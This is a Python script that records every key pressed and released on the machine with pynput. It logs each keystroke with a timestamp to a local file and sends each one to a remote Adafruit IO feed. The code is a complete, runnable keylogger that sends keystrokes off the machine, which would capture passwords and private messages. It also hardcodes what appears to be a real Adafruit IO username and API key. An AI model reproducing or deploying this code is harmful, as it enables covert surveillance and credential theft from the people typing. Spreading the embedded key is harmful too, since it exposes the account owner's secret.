from pynput import keyboard

from Adafruit_IO import Client, Feed, RequestError

import calendar
import time

ADAFRUIT_IO_USERNAME = 'Paces53'
ADAFRUIT_IO_KEY = 'aio_nqoI77kQJQHwz74qcy5vhBwm0zOV'

# Create an instance of the REST client.
aio = Client(ADAFRUIT_IO_USERNAME, ADAFRUIT_IO_KEY)

adafeed = aio.feeds('sensorfeed')


# detect keypress
def on_press(key):
    f = open("logger.txt", "a")
    try:
        print('alphanumerickey{0} pressed'.format(key.char))
        ts = calendar.timegm(time.gmtime())
        upper = str(key.char).upper()
        f.write(str(ts) + ':' + 'KeyPressed' + ':' + upper + '\n')
        aio.send(adafeed.key, upper)
        time.sleep(4)
    except:
        print('special key {0} pressed'.format(key))
        ts = calendar.timegm(time.gmtime())
        upper = str(key).upper()
        f.write(str(ts) + ':' + 'KeyPressed' + ':' + upper + '\n')
        aio.send(adafeed.key, upper)
    f.close()


# deatect key releases
def on_release(key):
    f = open("logger.txt", "a")
    ts = calendar.timegm(time.gmtime())
    print('{0} released'.format(key))
    upper = str(key).upper()
    f.write(str(ts) + ':' + 'KeyRealease' + ':' + upper + '\n')
    aio.send(adafeed.key, upper)
    if key == keyboard.Key.esc:
        # Stop Listener
        print('Stop')
        return False


# Collectevents
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()
